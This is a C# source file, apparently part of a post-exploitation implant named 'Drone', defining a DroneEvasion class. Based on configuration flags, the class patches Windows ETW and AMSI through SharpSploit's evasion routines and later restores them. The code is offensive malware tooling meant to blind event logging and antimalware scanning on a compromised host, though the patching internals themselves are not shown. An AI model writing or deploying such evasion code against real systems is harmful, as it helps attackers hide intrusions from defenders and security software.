using Drone.SharpSploit.Evasion;

namespace Drone
{
    public class DroneEvasion
    {
        private readonly DroneConfig _config;

        private Amsi _amsi;
        private Etw _etw;

        public DroneEvasion(DroneConfig config)
        {
            _config = config;
        }

        public void RestoreEvasionMethods()
        {
            RestoreEtw();
            RestoreAmsi();
        }

        public void DeployEvasionMethods()
        {
            BypassEtw();
            BypassAmsi();
        }

        public void BypassEtw()
        {
            var bypassEtw = _config.GetConfig<bool>("BypassEtw");

            if (!bypassEtw) return;

            _etw = new Etw();
            _etw.Patch();
        }

        public void RestoreEtw()
        {
            var bypassEtw = _config.GetConfig<bool>("BypassEtw");
            if (bypassEtw)
                if (_etw != null)
                    _etw.Restore();
        }

        public void BypassAmsi()
        {
            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");

            if (!bypassAmsi) return;

            _amsi = new Amsi();
            _amsi.Patch();
        }

        public void RestoreAmsi()
        {
            var bypassAmsi = _config.GetConfig<bool>("BypassAmsi");
            if (bypassAmsi)
                if (_amsi != null)
                    _amsi.Restore();
        }
    }
}